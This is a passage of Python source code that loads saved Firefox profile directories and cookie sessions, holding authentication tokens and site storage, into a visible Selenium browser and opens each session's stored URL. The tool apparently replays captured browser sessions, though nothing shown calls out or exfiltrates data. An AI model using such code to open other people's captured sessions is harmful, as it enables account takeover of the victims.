            self.browsers.append(browser)
            status(f"✓ Session {session_id} loaded successfully from cookies")

        except Exception as e:
            # Fallback for unexpected errors
            if Settings.debug:
                error(f"Unexpected error loading cookie session: {str(e)}")
                traceback.print_exc()
            else:
                error("Failed to load session. Enable debug mode for details.")
        finally:
            # Cleanup on failure
            if browser and not any(b == browser for b in self.browsers):
                try:
                    browser.quit()
                except Exception:
                    if Settings.debug:
                        traceback.print_exc()

    def load_profile(self, session_id):
        """Load a previously saved Firefox profile directory into a visible browser.

        The profile directory contains all session data:
        - Cookies and authentication tokens
        - localStorage and sessionStorage
        - IndexedDB data
        - Service worker data
        - Cache and history
        """
        browser = None
        try:
            # ==== VALIDATION PHASE ====
            # 1. Verify sessions file exists
            if not os.path.exists(self.sessions_file):
                error(f"Sessions file not found: {self.sessions_file}")
                return

            # 2. Load and parse sessions.json
            try:
                with open(self.sessions_file, "r") as _sf:
                    sessions = json.load(_sf)
            except json.JSONDecodeError:
                error("Sessions file is corrupted (invalid JSON)")
                return
            except Exception as e:
                error(f"Failed to read sessions file: {str(e)}")
                return

            # 3. Verify session exists
            if str(session_id) not in sessions:
                error(f"Session {session_id} not found in sessions file")
                return

            session_data = sessions[str(session_id)]

            # 4. Validate required fields
            profile_path = session_data.get("session_path")
            url = session_data.get("web_url")
            useragent = session_data.get("useragent", "(default)")

            if not profile_path:
                error(f"Session {session_id}: Missing 'session_path' field")
                return
            if not url:
                error(f"Session {session_id}: Missing 'web_url' field")
                return

            # 5. Verify profile directory exists
            if not os.path.isdir(profile_path):
                error(f"Profile directory not found: {profile_path}")
                return

            # 6. Verify profile directory is readable
            if not os.access(profile_path, os.R_OK | os.X_OK):
                error(f"Profile directory not accessible: {profile_path}")
                return

            # 7. Verify Firefox profile structure (check for prefs.js)
            prefs_file = os.path.join(profile_path, "prefs.js")
            if not os.path.exists(prefs_file):
                if Settings.debug:
                    status(f"Warning: Firefox prefs.js not found in {profile_path}")
                # Not critical, continue anyway

            if Settings.debug:
                status(f"Loading profile directory: {profile_path}")

            # ==== BROWSER INITIALIZATION PHASE ====
            # 8. Check Firefox binary exists
            if not self.browser_path:
                error("Firefox not found. Please install Firefox.")
                return

            if Settings.debug:
                status(f"Opening Firefox browser: {self.browser_path}")

            # 9. Build Firefox options for visible browser (headless=False)
            options = build_firefox_options(
                useragent, headless=False, binary_path=self.browser_path
            )

            # 10. Add the Firefox profile directory
            # Firefox profile argument format (Selenium 4+):
            # -profile /path/to/profile
            try:
                options.add_argument("-profile")
                options.add_argument(profile_path)
            except Exception as e:
                error(f"Failed to add profile argument: {str(e)}")
                return

            # 11. Create Firefox service and browser instance
            service = build_firefox_service(self.geckodriver_path)
            try:
                browser = (
                    webdriver.Firefox(service=service, options=options)
                    if service
                    else webdriver.Firefox(options=options)
                )
            except Exception as e:
                if "Firefox" in str(e):
                    error(
                        "Firefox failed to start. Check your installation "
                        "and permissions."
                    )
                elif "geckodriver" in str(e):
                    error("Geckodriver not found. Check your Selenium Manager setup.")
                else:
                    error(f"Failed to initialize Firefox: {str(e)}")
                return

            # ==== NAVIGATION PHASE ====
            # 12. Navigate to the session URL
            try:
                if Settings.debug:
                    status(f"Navigating to {url}...")
                browser.get(url)
            except Exception as e:
                error(f"Failed to navigate to {url}: {str(e)}")
                return

            # 13. Wait for page to load completely
            try:
                WebDriverWait(browser, 15).until(
                    lambda d: d.execute_script("return document.readyState")
                    == "complete"
                )
            except Exception as e:
                # Not critical, page might be loading async content
                if Settings.debug:
                    status(f"Page load timeout (continuing anyway): {str(e)}")

            # ==== SUCCESS ====
            # Browser is now fully loaded with the profile
            self.browsers.append(browser)
            status(f"✓ Session {session_id} loaded successfully")
            status(f"✓ Profile: {profile_path}")
            status(f"✓ URL: {url}")

        except Exception as e:
            # Fallback for unexpected errors
            if Settings.debug:
                error(f"Unexpected error loading profile: {str(e)}")
                traceback.print_exc()
            else:
                error("Failed to load session. Enable debug mode for details.")
        finally:
            # Cleanup on failure
            if browser and not any(b == browser for b in self.browsers):
                try:
                    browser.quit()
                except Exception:
                    if Settings.debug:
                        traceback.print_exc()
